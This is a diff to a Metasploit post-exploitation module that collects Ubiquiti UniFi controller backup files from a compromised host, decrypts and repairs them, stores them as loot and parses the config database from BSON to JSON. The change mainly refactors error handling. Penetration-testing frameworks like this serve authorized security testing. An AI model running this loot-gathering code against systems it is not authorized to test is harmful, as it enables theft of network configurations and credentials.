@@ -46,29 +46,6 @@ class MetasploitModule < Msf::Post
       ])
   end
 
-  def extract_and_process_db(db_path)
-    f = nil
-    Zip::File.open(db_path) do |zip_file|
-      # Handle entries one by one
-      zip_file.each do |entry|
-        # Extract to file
-        if entry.name == 'db.gz'
-          print_status('extracting db.gz')
-          gz = Zlib::GzipReader.new(entry.get_input_stream)
-          f = gz.read
-          gz.close
-        end
-      end
-    end
-    print_status('Converting config BSON to JSON')
-    unifi_config = bson_to_json(f)
-    if unifi_config == {}
-      print_bad('Error in conversion')
-      return
-    end
-    unifi_config_eater(session.session_host, session.session_port, unifi_config)
-  end
-
   def find_save_files(d)
     case session.platform
     when 'windows'
@@ -109,13 +86,22 @@ class MetasploitModule < Msf::Post
       # tested on kali
       repaired = repair_zip(loot_path)
       if repaired.nil?
-        print_bad("Repair failed on #{loot_path}")
-        return
+        fail_with Failure::Unknown, "Repair failed on #{loot_path.path}"
       end
       loot_path = store_loot('ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,
                              repaired, "#{file}.zip", 'Ubiquiti Unifi Controller Backup Zip')
       print_good("File #{full} DECRYPTED and REPAIRED and saved to #{loot_path}.")
-      extract_and_process_db(loot_path)
+      config_db = extract_and_process_db(loot_path)
+      if config_db.nil?
+        fail_with Failure::Unknown, 'Unable to locate db.gz config database file'
+      end
+      print_status('Converting BSON to JSON.')
+      unifi_config_db_json = bson_to_json(config_db)
+
+      if unifi_config_db_json == {}
+        fail_with Failure::Unknown, 'Error in file conversion from BSON to JSON.'
+      end
+      unifi_config_eater(session.session_host, session.session_port, unifi_config_db_json)
     end
   end
 
